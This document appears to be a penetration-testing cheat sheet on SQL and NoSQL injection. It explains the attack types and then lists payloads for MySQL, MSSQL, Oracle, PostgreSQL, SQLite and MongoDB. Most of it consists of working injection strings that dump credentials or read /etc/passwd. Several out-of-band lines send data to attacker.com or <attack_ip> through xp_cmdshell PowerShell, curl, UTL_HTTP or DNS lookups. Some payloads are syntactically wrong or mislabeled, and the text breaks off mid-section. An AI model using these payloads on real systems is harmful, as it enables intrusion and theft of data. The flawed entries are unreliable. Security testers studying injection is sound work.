# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]
- [[P1433 MSSQL]]
- [[P1521 Oracle SQL NET]]
- [[P3306 MySQL]]
- [[P5432 5433 PostgreSQL]]
- [[P27017 MongoDB]]

# SQL Injection (SQLi)

SQL Injection (SQLi) is a type of security vulnerability that occurs when an attacker is able to manipulate the queries sent to a database by injecting malicious SQL code through input fields, URL parameters, or other input points in a web application. This can result in unauthorized access to database data, modification or deletion of data, and potentially the complete compromise of the web application and underlying server.

# How SQL Injection Works

1. **Injection:** The attacker injects malicious SQL code into an input point in the web application. This input is sent to the server as part of an SQL query.
2. **Execution:** The server executes the crafted SQL query, including the injected code, without proper validation or sanitization.
3. **Impact:** The malicious SQL code can perform various actions, such as:
    - **Data Exfiltration:** Retrieving sensitive data from the database.
    - **Data Modification:** Altering or deleting database records.
    - **Privilege Escalation:** Gaining administrative access to the database.
    - **Denial of Service:** Disrupting database operations.

# Types of SQL Injection

## In-Band SQLi (Classic SQLi)
In-Band SQL Injection, also known as Classic SQLi, is the most common and straightforward form of SQLi. The attacker can use the same communication channel to both inject the malicious SQL code and retrieve the results.

### How In-Band SQLi Works

1. **Injection:** An attacker injects malicious SQL code through an input field.
2. **Execution:** The database server executes the crafted SQL query.
3. **Result Retrieval:** The attacker retrieves the results through the same input field, often displayed on the application's webpage.

### Error-Based SQLi
Leverages database errors to gain information about the structure of the database. Force the database to return an error message containing useful information. If the `ORDER BY 100` clause causes an error, the attacker can deduce the number of columns in the original query.

```
' OR 1=1 ORDER BY 100 -- 
```

#### Error-Based SQLi Types

- **Syntax Error:** When an attacker introduces a syntax error into an SQL query, the database might return an error message that exposes details about the query structure.

```
' OR 1=1--

SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1--';
```

- **Type Conversion Error:** Triggers an error by attempting to convert a string to an integer.

```
' AND 1=CONVERT(int, 'text') -- -
```

- **Division by Zero:** This payload attempts to divide by zero, which typically causes an error, potentially leaking database information in the error message. Some databases allow SQL queries that can cause runtime errors, such as division by zero. This can be exploited to extract information. 

```
' OR 1=1; SELECT 1/0; --
' AND 1/0=1 --
1/(SELECT COUNT(*) FROM users)

SELECT * FROM users WHERE id = 1 AND 1/(SELECT COUNT(*) FROM users) = 1;
```

#### Error-Based SQLi Enumeration 
Microsoft SQL Server (MSSQL) also provides detailed error messages. Here are some example payloads:

- **Version Information:**

```
1' AND 1=CONVERT(int, @@version)--
```

- **Database Name:**

```
1' AND 1=CONVERT(int, DB_NAME())--
```

- **Extracting Table Names:**

```
1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
```

### Union-Based SQLi
Uses the `UNION` SQL operator to combine the results of two queries into a single result set, which is then returned to the application. Combine the results of a malicious query with a legitimate one. The attacker appends a `UNION` clause to merge the results of the `users` table with the original query.

```
' UNION SELECT null, username, password FROM users -- 
```

#### Union-Based SQLi Enumeration
Union-Based SQLi exploits the ability to inject a `UNION` query that is syntactically correct and returns meaningful data. The attacker's goal is to append their own `SELECT` query that extracts sensitive data from other tables within the database.

- **Finding Database Version:**

```
UNION SELECT 1, @@version, 3; -- The @@version variable returns the database version
```

- **Listing All Databases:**

```
UNION SELECT 1, schema_name, 3 FROM information_schema.schemata;
```

- **Listing All Tables in a Specific Database:**

```
UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='database_name';
```

- **Listing All Columns in a Specific Table:**

```
UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='table_name';
```

- **Extracting Multiple Columns:** This payload extracts the database name and current user, combining it with the result set of the original query.

```
' UNION SELECT 1, database(), user(), 4 --
```

- **Enumerating All Tables:**  This payload retrieves all table names from the current database schema and combines them with the original query.

```
' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = database() --
```

- **Extracting All Usernames and Passwords (MySQL):**

```
' UNION SELECT null, username, password FROM users -- 
```

- **Retrieve All Tables in the Database (MySQL):**

```
' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = database() -- 
```

- **Extracting Data from Multiple Columns (MSSQL):**

```
' UNION SELECT null, username, password, email FROM users -- 
```

## Inferential SQLi (Blind SQLi)
Inferential SQL Injection, also known as Blind SQLi, occurs when the attacker cannot directly see the results of the executed query. Instead, they infer the results based on the application's behavior or response times.

### How Inferential SQLi Works

1. **Injection:** An attacker injects SQL code to infer the database's response.
2. **Execution:** The database server executes the crafted SQL query.
3. **Observation:** The attacker observes the application's behavior or response times to infer the results.

### Boolean-Based Blind SQLi
The attacker sends SQL queries that ask the database a series of true or false questions. Extract information by observing the application's response to different conditions. The attacker tests the application by manipulating boolean conditions to infer whether certain queries are true or false based on the application's behavior.

```
' AND 1=1 --
' AND 1=2 -- 
```

If the application behaves normally, it indicates the query is true. If it behaves differently, the query is false.

#### Boolean-Based SQLi Types

- **Basic True Condition:** Always evaluates to true, confirming that SQL injection is possible if the application's behavior changes.

```
' OR '1'='1' -- -
```

- **Basic False Condition:** Always evaluates to false, used to compare the application's response with the true condition.

```
' OR '1'='2' -- -
```

### Time-Based Blind SQLi
The attacker sends SQL queries that cause the database to wait for a specified amount of time before responding, indicating the truthfulness of a condition. Infer information by causing a delay in the application's response. If the query takes longer to execute, the attacker can deduce that the condition is true.

```
' OR IF(1=1, SLEEP(5), 0) --
```

If the response is delayed, it indicates the condition is true.

#### Time-Based SQLi Types

- **Basic Time Delay Test:** Causes the database to sleep for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

```
' OR SLEEP(5) -- -
```

- **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true. Used to test if conditions can influence response time.

```
' AND IF(1=1, SLEEP(5), 0) -- -
```

#### Time-Based SQLi Enumeration

- **Basic Time Delay Test:** Causes the database to sleep for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

```
' OR SLEEP(5) -- -
```

- **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true. Used to test if conditions can influence response time.

```
' AND IF(1=1, SLEEP(5), 0) -- -
```

- **Testing for Existence of a Table:** Causes a 5-second delay if the `users` table exists in the database.

```
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0, SLEEP(5), 0) -- -
```

- **Extracting Length of Database Name:** Causes a 5-second delay if the length of the current database name is 5 characters.

```
' AND IF(LENGTH(database())=5, SLEEP(5), 0) -- -
```

- **Extracting Specific Character in Database Name:** Causes a 5-second delay if the first character of the database name is 'a'. This can be repeated for each character.

```
' AND IF(SUBSTRING(database(), 1, 1)='a', SLEEP(5), 0) -- -
```

## Out-of-Band SQLi
Out-of-Band SQL Injection occurs when the attacker cannot use the same channel to inject the malicious code and retrieve the results. Instead, they rely on different channels, such as DNS or HTTP requests, to retrieve the data.

- **Key Requirements for Out-of-Band SQLi:**
	- **Network Access:** The database server must have outbound network connectivity, allowing it to communicate with external systems over DNS, HTTP, or other protocols.
	- **Database Functions:** The database must support functions that enable network communication, such as `LOAD_FILE()`, `UTL_HTTP`, or `XP_FILEEXIST`.

### How Out-of-Band SQLi Works

1. **Injection:** An attacker injects SQL code to trigger an out-of-band communication.
2. **Execution:** The database server executes the crafted SQL query.
3. **Result Retrieval:** The attacker retrieves the results through a separate channel, such as a DNS or HTTP request.

### Out-of-Band SQLi
Use alternative channels (like HTTP or DNS) to extract data. This query attempts to read a file from the server and write its contents to an external file, which could then be accessed by the attacker.

```
' UNION SELECT load_file('/etc/passwd') INTO OUTFILE '/tmp/output.txt' --
```


#### Out-of-Band SQLi Types

- **Extracting Data via DNS (MySQL):** This query attempts to read a file from the server and write its contents to a remote SMB share controlled by the attacker.

```
' UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '\\\\<attack_ip>\\share\\output.txt' -- 
```
   
- **Out-of-Band Data Extraction via HTTP (MSSQL):** This payload uses `xp_cmdshell` to execute a PowerShell command that sends the database name to an external server controlled by the attacker.

```
'; EXEC master..xp_cmdshell 'powershell Invoke-WebRequest -Uri http://<attack_ip>/data?db_name=' + (SELECT DB_NAME()) -- 
```

- **Exfiltrating Data via DNS Lookup (MySQL):** This payload attempts to exfiltrate the `/etc/passwd` file by sending its contents via a DNS query to the attacker’s controlled server.

```
'; SELECT load_file('/etc/passwd') INTO DUMPFILE '\\\\\\<attack_ip>\\\\data' -- 
```

- **Using Out-of-Band Channels to Extract Data:** This payload attempts to send the database user information via a DNS request to a domain controlled by the attacker.

```
' AND LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.<attacker_ip>\\null')) --
```

# SQLi Payloads 

## [[P3306 MySQL]]

### Error-Based SQLi

- **Version Information:** Causes an error that reveals the MySQL version.

```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

- **User Information:** Extracts the current database user.

```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

- **Database Name:** Reveals the name of the current database.

```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

- **Column Name Extraction:** Causes an error that exposes a column name from a specified table.

```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

### Union-Based SQLi

- **Database Version:** Appends the MySQL version to the query results.

```
' UNION SELECT NULL, version() -- -
```

- **Database Name:** Retrieves the name of the current database.

```
' UNION SELECT NULL, database() -- -
```

- **Table Name Enumeration:** Extracts the name of a table from the current database.

```
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 -- -
```

- **Column Name Enumeration:** Retrieves the name of a column from the specified table.

```
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 -- -
```

- **Data Extraction:** Extracts data from specific columns in the `users` table.

```
' UNION SELECT NULL, username, password FROM users -- -
```

### Boolean-Based SQLi

- **Checking MySQL Version:** Evaluates to true if the MySQL version starts with '5'.

```
' AND SUBSTRING(version(), 1, 1) = '5' -- -
```

- **Determining the Number of Tables:** Evaluates to true if there are more than 10 tables in the current database.

```
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 10 -- -
```

- **Checking Existence of a Column:** Evaluates to true if the `password` column exists in the `users` table.

```
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
```

- **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `users` table is 'a'.

```
' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a' -- -
```

### Time-Based SQLi

- **Checking MySQL Version:** Causes a 5-second delay if the MySQL version starts with '5'.

```
' AND IF(SUBSTRING(version(), 1, 1)='5', SLEEP(5), 0) -- -
```

- **Determining the Number of Tables:** Causes a 5-second delay if there are more than 10 tables in the current database.

```
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 10, SLEEP(5), 0) -- -
```

- **Checking Existence of a Column:** Causes a 5-second delay if the `password` column exists in the `users` table.

```
' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0, SLEEP(5), 0) -- -
```

- **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `users` table is 'a'.

```
' AND IF((SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1)='a', SLEEP(5), 0) -- -
```

### Out-of-Band SQLi

- **DNS Exfiltration Using LOAD_FILE():** Causes the MySQL database to attempt to load a file from an attacker-controlled domain, exfiltrating the database name via a DNS query.

```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', database(), '.attacker.com\\')) -- -
```

- **DNS Exfiltration Using INTO OUTFILE:** Attempts to write data to a file on a remote SMB server controlled by the attacker, leaking the database name.

```
' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\dbname.txt' -- -
```

- **HTTP Exfiltration Using UDF:** Loads a user-defined function (UDF) that allows MySQL to make HTTP requests, sending the database name to the attacker's server.

```
' UNION SELECT 1 INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_http.so';  ' SELECT HTTP_GET(CONCAT('http://attacker.com/?db=',database())); -- -
```

## [[P1433 MSSQL]]

### Error-Based Payloads

- **Version Information:** Retrieves the MSSQL version, causing a conversion error.

```
' AND 1=CONVERT(int, @@version) -- -
```

- **Database Name:** Extracts the current database name by forcing a conversion error.

```
' AND 1=CONVERT(int, DB_NAME()) -- -
```

- **Table Name Extraction:** Generates an error while attempting to retrieve the first table name.

```
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) -- -
```

- **Data Type Mismatch:** Forces a type mismatch error by trying to convert a string to an integer.

```
' AND 1=CONVERT(int, 'A') -- -
```

### Union-Based SQLi

- **Database Version:** Retrieves the SQL Server version.

```
' UNION SELECT NULL, @@version -- -
```

- **Database Name:** Extracts the current database name.

```
' UNION SELECT NULL, DB_NAME() -- -
```

- **Table Name Enumeration:** Lists the names of all user-defined tables.

```
' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U' -- -
```

- **Column Name Enumeration:** Retrieves the column names for a specified table.

```
' UNION SELECT NULL, name FROM syscolumns WHERE id=OBJECT_ID('users') -- -
```

- **User Data Extraction:** Extracts usernames and passwords from the `users` table.

```
' UNION SELECT NULL, username, password FROM users -- -
```

### Boolean-Based SQLi

- **Checking MSSQL Version:** Evaluates to true if the MSSQL version starts with '8'.

```
' AND SUBSTRING(@@version, 1, 1) = '8' -- -
```

- **Determining the Number of Users:** Evaluates to true if there are more than 5 users in the database.

```
' AND (SELECT COUNT(*) FROM sysusers) > 5 -- -
```

- **Checking Existence of a Table:** Evaluates to true if the `users` table exists.

```
' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U' AND name='users') > 0 -- -
```

- **Extracting Data from a Column:** Evaluates to true if the first character of the `users` table name is 'u'.

```
' AND (SELECT SUBSTRING(name, 1, 1) FROM sysobjects WHERE xtype='U' AND name='users') = 'u' -- -
```

### Time-Based SQLi

- **Basic Time Delay Test:** Causes the SQL Server to wait for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

```
'; WAITFOR DELAY '0:0:5' -- -
```

- **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

```
'; IF (1=1) WAITFOR DELAY '0:0:5' -- -
```

- **Checking MSSQL Version:** Causes a 5-second delay if the MSSQL version starts with '8'.

```
'; IF (SUBSTRING(@@version, 1, 1) = '8') WAITFOR DELAY '0:0:5' -- -
```

- **Checking Existence of a Table:** Causes a 5-second delay if the `users` table exists.

```
'; IF EXISTS (SELECT * FROM sysobjects WHERE xtype='U' AND name='users') WAITFOR DELAY '0:0:5' -- -
```

- **Extracting Data from a Column:** Causes a 5-second delay if the first character of the `users` table name is 'u'.

```
'; IF (SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1)='u') WAITFOR DELAY '0:0:5' -- -
```

### Out-of-Band SQLi

- **DNS Exfiltration Using XP_DIRTREE:** Causes the MSSQL server to attempt to list a directory on an attacker-controlled SMB server, leaking database names via DNS queries.

```
'; EXEC master..xp_dirtree '\\attacker.com\' + (SELECT name FROM master..sysdatabases) -- -
```

- **HTTP Exfiltration Using XP_CMD_SHELL:** Uses the `xp_cmdshell` stored procedure to execute a PowerShell command that sends database names to the attacker's server via HTTP.

```
'; EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://attacker.com/?data=' + (SELECT name FROM master..sysdatabases) -- -
```

- **Data Exfiltration Using OLE Automation Procedures:** Uses OLE Automation Procedures to make an HTTP GET request to an attacker-controlled server, exfiltrating the current database user.

```
'; DECLARE @obj INT;  EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;  EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/?user='+ (SELECT SYSTEM_USER), false;  EXEC sp_OAMethod @obj, 'send'; -- -
```

## [[P1521 Oracle SQL NET]]

### Error-Based SQLi

- **Division by Zero:** Causes a division by zero error.

```
' AND 1/(SELECT COUNT(*) FROM all_tables)=0 -- -
```

 - **Column Length Error:** Forces an error by exceeding the column length limit.

```
' AND 1=UTL_INADDR.get_host_address((SELECT column_name FROM all_tab_columns WHERE ROWNUM = 1)) -- -
```

- **Function Error:** Uses a length mismatch to cause an error.

```
' AND LENGTH((SELECT banner FROM v$version WHERE ROWNUM = 1))=1000 -- -
```

### Union-Based SQLi

- **Database Version:** Retrieves the Oracle database version.

```
' UNION SELECT NULL, banner FROM v$version WHERE ROWNUM=1 -- -
```

**Database User:** Extracts the current Oracle database user.

```
' UNION SELECT NULL, user FROM dual -- -
```

- **Table Name Enumeration:** Lists the names of all tables accessible by the user.

```
' UNION SELECT NULL, table_name FROM all_tables WHERE ROWNUM=1 -- -
```

- **Column Name Enumeration:** Extracts the column names from a specified table.

```
' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1 -- -
```

- **User Data Extraction:** Retrieves usernames and passwords from the `USERS` table.

```
' UNION SELECT NULL, username, password FROM USERS -- -
```

### Boolean-Based SQLi

- **Checking Oracle Version:** Evaluates to true if the Oracle version starts with '1'.

```
' AND SUBSTR(BANNER, 1, 1) = '1' FROM v$version WHERE ROWNUM = 1 -- -
```

- **Determining the Number of Tables:** Evaluates to true if there are more than 100 tables.

```
' AND (SELECT COUNT(*) FROM all_tables) > 100 -- -
```

- **Checking Existence of a Column:** Evaluates to true if the `PASSWORD` column exists in the `USERS` table.

```
' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'USERS' AND column_name = 'PASSWORD') > 0 -- -
```

- **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `USERS` table is 'a'.

```
' AND (SELECT SUBSTR(USERNAME, 1, 1) FROM USERS WHERE ROWNUM = 1) = 'a' -- -
```

### Time-Based SQLi 

- **Basic Time Delay Test:** Causes the Oracle database to wait for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

```
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 5) -- -
```

- **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

```
' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
```

- **Checking Oracle Version:** Causes a 5-second delay if the Oracle version starts with '1'.

```
' AND CASE WHEN (SUBSTR(BANNER, 1, 1) = '1') THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END FROM v$version WHERE ROWNUM = 1 -- -
```

- **Checking Existence of a Table:** Causes a 5-second delay if the `USERS` table exists.

```
' AND CASE WHEN (EXISTS (SELECT 1 FROM all_tables WHERE table_name = 'USERS')) THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
```

- **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `USERS` table is 'a'.

```
' AND CASE WHEN (SUBSTR((SELECT USERNAME FROM USERS WHERE ROWNUM = 1), 1, 1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('a', 5) ELSE NULL END -- -
```

### Out-of-Band SQLi

- **DNS Exfiltration Using UTL_INADDR:** Causes Oracle to perform a DNS lookup, appending the database username to the attacker's domain, thus exfiltrating the username via DNS.

```
' AND (SELECT UTL_INADDR.get_host_name((SELECT user FROM dual || '.attacker.com')) FROM dual) IS NOT NULL -- -
```

- **HTTP Exfiltration Using UTL_HTTP:** Sends an HTTP request containing the current Oracle database user to an attacker-controlled server.

```
' AND (SELECT UTL_HTTP.request('http://attacker.com/?user=' || user) FROM dual) IS NOT NULL -- -
```

- **HTTP Exfiltration Using DBMS_LDAP:** Uses the Oracle DBMS_LDAP package to initiate a connection to an LDAP server controlled by the attacker, leaking data.

```
' AND (SELECT DBMS_LDAP.init('attacker.com', 389) FROM dual) IS NOT NULL -- -
```

## [[P5432 5433 PostgreSQL]]

### Error-Based SQLi

- **Substring Error:** Triggers an error by exceeding the allowable substring length.

```
' AND 1=(SELECT SUBSTRING(version(), 1, 1000)) -- -
```

- **Invalid Cast:** Generates a cast error by converting a user name to an integer.

```
' AND 1=CAST((SELECT current_user) AS int) -- -
```

- **Division by Zero:** Forces a division by zero error.

```
' AND 1/(SELECT COUNT(*) FROM pg_catalog.pg_tables)=0 -- -
```

### Union-Based SQLi

- **Database Version:** Appends the PostgreSQL version to the result set.

```
' UNION SELECT NULL, version() -- -
```

- **Database Name:** Extracts the name of the current database.

```
' UNION SELECT NULL, current_database() -- -
```

- **Table Name Enumeration:** Lists the names of all tables in the `public` schema.

```
' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0 -- -
```

- **Column Name Enumeration:** Retrieves the column names from a specified table.

```
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0 -- -
```

- **User Data Extraction:** Extracts usernames and passwords from the `users` table.

```
' UNION SELECT NULL, username, password FROM users -- -
```

### Boolean-Based SQLi

- **Checking PostgreSQL Version:** Evaluates to true if the PostgreSQL version starts with '9'.

```
' AND SUBSTRING(version(), 1, 1) = '9' -- -
```

- **Determining the Number of Tables:** Evaluates to true if there are more than 10 tables in the `public` schema.

```
' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname = 'public') > 10 -- -
```

- **Checking Existence of a Column:** Evaluates to true if the `password` column exists in the `users` table.

```
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
```

- **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `users` table is 'a'.

```
' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a' -- -
```

### Time-Based SQLi

- **Basic Time Delay Test:** Causes the PostgreSQL database to sleep for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

```
' OR pg_sleep(5) -- -
```

- **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

```
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
```

- **Checking PostgreSQL Version:** Causes a 5-second delay if the PostgreSQL version starts with '9'.

```
' OR (SELECT CASE WHEN (SUBSTRING(version(), 1, 1) = '9') THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
```

- **Checking Existence of a Table:** Causes a 5-second delay if the `users` table exists in the `public` schema.

```
' OR (SELECT CASE WHEN (EXISTS (SELECT 1 FROM pg_tables WHERE schemaname = 'public' AND tablename = 'users')) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -
```

- **Extracting Data from a Column:** Causes a 5-second delay if the first character of the first username in the `users` table is 'a'.

```
' OR (SELECT CASE WHEN (SUBSTRING(username, 1, 1) = 'a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1) -- -
```

### Out-of-Band SQLi

- **DNS Exfiltration Using COPY:** Uses the `COPY` command to send the database version to an attacker-controlled DNS server.

```
' COPY (SELECT version()) TO PROGRAM 'nslookup $(database()).attacker.com' -- -
```

- **HTTP Exfiltration Using PL/pgSQL:** Uses the `dblink` extension to send the current PostgreSQL user to an attacker-controlled server.

```
' DO $$ BEGIN PERFORM dblink_connect('host=attacker.com user=attacker password=pass');  PERFORM dblink_exec('INSERT INTO exfiltrated_data(data) VALUES (''' || current_user || ''')');  END $$; -- -
```

- **Exfiltration Using LO_EXPORT:** Exports the current user to a file and sends it to an attacker-controlled server via an HTTP POST request.

```
' SELECT lo_export(lo_creat(-1), '/tmp/' || current_user || '.txt');  COPY (SELECT lo_import('/tmp/' || current_user || '.txt')) TO PROGRAM 'curl -X POST --data-binary @/tmp/' || current_user || '.txt http://attacker.com/'; -- -
```

## SQLite

### Error-Based SQLi

- **Type Mismatch:** Causes an error by casting a string to an integer.

```
' AND 1=CAST('a' AS int) -- -
```

- **Version Information:** Triggers an error by comparing the SQLite version to an invalid number.

```
' AND sqlite_version()=0 -- -
```

- **Invalid Function:** Causes an error by exceeding the length limit of a function.

```
' AND LENGTH((SELECT sql FROM sqlite_master WHERE type='table' AND name='users'))=1000 -- -
```

### Union-Based SQLi

- **SQLite Version:** Appends the SQLite version to the result set.

```
' UNION SELECT NULL, sqlite_version() -- -
```

- **Table Name Enumeration:** Retrieves the name of a table from the database schema.

```
' UNION SELECT NULL, name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0 -- -
```

- **Column Name Enumeration:** Extracts the column definitions from a specified table.

```
' UNION SELECT NULL, sql FROM sqlite_master WHERE type='table' AND name='users' -- -
```

- **User Data Extraction:** Extracts data from specified columns in the `users` table.

```
' UNION SELECT NULL, username, password FROM users -- -
```

### Boolean-Based SQLi

- **Checking SQLite Version:** Evaluates to true if the SQLite version starts with '3'.

```
' AND SUBSTRING(sqlite_version(), 1, 1) = '3' -- -
```

- **Determining the Number of Tables:** Evaluates to true if there are more than 5 tables in the database.

```
' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table') > 5 -- -
```

- **Checking Existence of a Column:** Evaluates to true if the `password` column exists in the `users` table.

```
' AND (SELECT COUNT(*) FROM pragma_table_info('users') WHERE name='password') > 0 -- -
```

- **Extracting Data from a Column:** Evaluates to true if the first character of the first username in the `users` table is 'a'.

```
' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a' -- -
```

### Time-Based SQLi

- **Basic Time Delay Test:** Forces SQLite to take more time processing the query, creating an artificial delay.

```
' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) -- -
```

- **Conditional Time Delay:** Causes a time delay if the condition `1=1` is true.

```
' OR CASE WHEN (1=1) THEN 1 ELSE LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) END -- -
```

- **Checking SQLite Version:** Causes a time delay if the SQLite version starts with '3'.

```
' OR CASE WHEN (SUBSTR(sqlite_version(), 1, 1) = '3') THEN 1 ELSE LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) END -- -
```

- **Checking Existence of a Table:** Causes a time delay if the `users` table exists.

```
' OR CASE WHEN (EXISTS (SELECT 1 FROM sqlite_master WHERE type='table' AND name='users')) THEN 1 ELSE LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) END -- -
```

- **Extracting Data from a Column:** Causes a time delay if the first character of the `users` table name is 'u'.

```
' OR CASE WHEN (SUBSTRING((SELECT name FROM sqlite_master WHERE type='table' AND name='users'), 1, 1)='u') THEN 1 ELSE LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) END -- -
```

### Out-of-Band SQLi

- **DNS Exfiltration Using LOAD_EXTENSION:** Attempts to load a malicious extension that could be used to send data out-of-band, though SQLite's support for OOB techniques is limited.

```
' AND load_extension('/path/to/malicious/extension.so') -- -
```

- **Custom Network Interaction Using External Program:** This is an artificial delay payload, but SQLite does not natively support network operations for OOB exfiltration. An external extension or custom setup would be required.

```
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) -- -
```

- **Triggering External Interaction via SQLite-Shell:** Attempts to write to an external file that could be sent later via an external tool, though this is not a native SQLite feature.

```
' ; .output /tmp/output.txt; SELECT user(); .exit -- -
```

## [[P27017 MongoDB]]

### NoSQL Injection
MongoDB, as a NoSQL database, differs significantly from traditional SQL databases in structure, query language, and behavior. MongoDB doesn’t use SQL syntax, so traditional SQL Injection techniques don’t apply. However, MongoDB applications that improperly handle input data in their query operations may still be vulnerable to injection attacks. These attacks typically involve injecting malicious JavaScript or BSON (Binary JSON) code into queries, filters, or commands that MongoDB interprets and executes.

### Error-Based MongoDB Injection

- **Find Operation Error:** Causes an error in the find operation by injecting invalid BSON. Forces an error by including an invalid function (`undefined()`), which can help in understanding the error handling and possible error messages.

```
db.collection.find({ $where: "this.field == 'value' && undefined()" })
```

- **Projection Manipulation Error:** Injecting a malformed projection to cause an error. This payload injects an invalid operator in the projection, causing a parsing error.

```
db.collection.find({}, { "field": { $invalidOperator: "" } })
```

### Union-Based MongoDB Injection (Equivalent)
Since MongoDB doesn't support SQL or UNION operations, there isn't a direct equivalent of Union-Based SQLi. However, aggregation pipelines can sometimes be abused similarly if the input is improperly sanitized.

- **Aggregation Pipeline Manipulation:** Injects a stage into an aggregation pipeline to alter its behavior. Manipulates the pipeline to add a potentially malicious field, concatenating values to leak information.

```
db.collection.aggregate([
    { $match: { "field": "value" } },
    { $group: { _id: null, total: { $sum: 1 } } },
    { $addFields: { malicious: { $concat: ["$total", ".attacker.com"] } } }
])
```

### Boolean-Based MongoDB Injection

- **Boolean Condition Manipulation:** Manipulates a query with a Boolean condition to determine behavior based on truthy/falsy values. Evaluates to true for all documents, effectively bypassing authentication or access controls if the application doesn't properly handle this.

```
db.collection.find({ $where: "this.username == 'admin' || 1==1" })
```

- **Always True Injection:** A query condition that always evaluates to true, often bypassing security checks. This will match all documents because the `$where` clause always returns true, making any prior conditions ineffective.

```
db.collection.find({ "username": { $ne: "admin" }, $where: "1 == 1" })
```

### Time-Based MongoDB Injection
MongoDB doesn’t have a direct equivalent to `SLEEP()` in SQL, but JavaScript execution can introduce delays.

